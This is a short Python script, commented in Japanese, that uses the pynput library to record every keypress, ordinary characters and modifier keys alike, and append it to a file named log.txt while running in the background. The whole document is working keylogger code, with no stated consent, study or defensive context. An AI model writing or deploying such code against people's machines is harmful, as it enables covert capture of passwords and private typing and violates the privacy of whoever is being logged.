from pynput import keyboard  # モジュールpynputをインポート

def on_press(key):  # キーが押されたときに呼ばれる関数
    try:
        with open("log.txt", "a") as f:  # ログファイルを追記モードで開く
            f.write(str(key.char))  # 通常の文字キーを文字列として書き出す
    except AttributeError:  # 修飾キー（Shift, Ctrl, Enterなど）はchar属性がない
        with open("log.txt", "a") as f:
            f.write(str(key))  # 修飾キーはそのまま文字列で記録

with keyboard.Listener(on_press=on_press) as listener:  # キーボードイベントを監視
    listener.join()  # イベントが終了するまで待機（常駐）